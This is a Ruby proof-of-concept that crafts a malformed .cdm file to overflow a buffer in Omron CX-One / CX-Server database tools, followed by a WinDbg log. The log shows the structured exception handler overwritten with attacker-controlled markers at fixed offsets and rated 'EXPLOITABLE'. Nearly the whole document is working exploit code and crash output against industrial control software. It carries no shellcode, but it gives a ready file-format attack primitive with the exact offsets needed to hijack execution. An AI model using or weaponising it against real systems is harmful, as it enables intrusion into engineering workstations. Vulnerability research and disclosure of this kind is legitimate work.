#!/usr/bin/env ruby 
# Buffer Overflow when parsing an invalid .cdm file.
# Omron CX-One CXONE_v460_OB362.iso
# Omron CX-Server Import/Export Tool Version 5.0.27.0
# Omron CX-Server database manager 5.0.27.0
require 'rex'

fd = File.open('fuzz.cdm', 'rb')
new_bin = fd.read(fd.stat.size)
fd.close

data = Rex::Text.pattern_create(3024)
data[2716, 4] = [0x42424242].pack('V')
data[2720, 4] = [0x41414141].pack('V')

blah = new_bin
blah[25384, data.size] = data

x = File.new('lalo.cdm','wb')
x.write(blah)
x.close
__END__
(138.aa0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=01254c00 ebx=00004a00 ecx=0000004e edx=00000000 esi=01254ac8 edi=00130000
eip=765d9b60 esp=0012ee10 ebp=0012ee18 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010216
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\system32\msvcrt.dll - 
msvcrt!memcpy+0x250:
765d9b60 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\system32\ole32.dll - 
*** WARNING: Unable to verify checksum for C:\Windows\CDMCodebase32.dll
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\CDMCodebase32.dll - 
0:000> !exchain
0012ee48: ole32!HGLOBAL_UserUnmarshal+563 (766e6751)
0012f4fc: 41414141
Invalid exception stack at 42424242
0:000> !exploitable
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\system32\msi.dll - 
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - User Mode Write AV starting at msvcrt!memcpy+0x0000000000000250 (Hash=0x4a435e74.0x260c4501)

User mode write access violations that are not near NULL are exploitable.

